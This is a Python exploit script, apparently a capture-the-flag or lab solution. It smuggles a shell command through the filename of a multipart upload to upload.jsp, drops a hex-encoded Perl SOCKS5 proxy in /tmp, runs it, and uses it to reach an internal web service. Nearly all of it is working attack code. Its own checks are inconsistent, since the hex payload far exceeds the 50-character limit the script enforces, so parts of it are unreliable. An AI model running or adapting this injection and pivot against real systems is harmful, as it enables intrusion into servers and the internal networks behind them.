#!/usr/bin/env python3
import requests
import time
import subprocess

def create_payload():
    """Create minimal SOCKS5 proxy payload"""
    
    # Minimal SOCKS5 proxy code (one-liner)
    socks_code = '''use IO::Socket::INET;$s=IO::Socket::INET->new(LocalHost=>"127.0.0.1",LocalPort=>1080,Proto=>"tcp",Listen=>5,Reuse=>1)or die"$!";while($c=$s->accept()){if(fork()==0){$c->sysread($b,2);($v,$n)=unpack("CC",$b);$c->sysread($b,$n);$c->syswrite(pack("CC",5,0));$c->sysread($b,4);($v,$cmd,$r,$a)=unpack("CCCC",$b);$c->sysread($b,1);$l=unpack("C",$b);$c->sysread($b,$l);$addr=$b;$c->sysread($b,2);$port=unpack("n",$b);$r=IO::Socket::INET->new(PeerHost=>$addr,PeerPort=>$port,Proto=>"tcp")or next;$c->syswrite(pack("CCCC",5,0,0,1).pack("NN",0,0));while($c->sysread($d,4096)){$r->syswrite($d);}while($r->sysread($d,4096)){$c->syswrite($d);}exit;}$c->close();}'''
    
    # Convert to hex
    hex_code = socks_code.encode().hex()
    
    # Create command to write and execute
    command = f"echo -n '{hex_code}' | perl -e 'print pack(\"H*\",<STDIN>)' > /tmp/s.pl && chmod +x /tmp/s.pl && /tmp/s.pl &"
    
    # Escape for command injection
    escaped = command.replace("'", "'\"'\"'")
    
    # Create filename payload
    filename = f"';{escaped};echo '"
    
    return filename

def exploit():
    """Execute the exploit"""
    print("=== Quick SOCKS5 Proxy Exploit ===")
    
    # Create payload
    filename = create_payload()
    print(f"Payload length: {len(filename)} chars")
    
    if len(filename) >= 50:
        print("ERROR: Payload too long!")
        return False
    
    # Upload with payload
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    body = f"""--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{filename}"\r
Content-Type: text/plain\r
\r
dummy\r
--{boundary}--\r
"""
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body))
    }
    
    try:
        response = requests.post('http://localhost:8080/upload.jsp', data=body, headers=headers)
        print(f"Upload response: {response.status_code}")
        
        # Wait for SOCKS5 to start
        print("Waiting for SOCKS5 proxy...")
        time.sleep(3)
        
        # Test SOCKS5
        result = subprocess.run([
            'curl', '--socks5', '127.0.0.1:1080', 
            '--connect-timeout', '5',
            'http://internal_web:5000/'
        ], capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0 and "Congratulation" in result.stdout:
            print("SUCCESS! SOCKS5 proxy working!")
            print("Response:", result.stdout.strip())
            return True
        else:
            print("SOCKS5 test failed")
            return False
            
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    exploit()




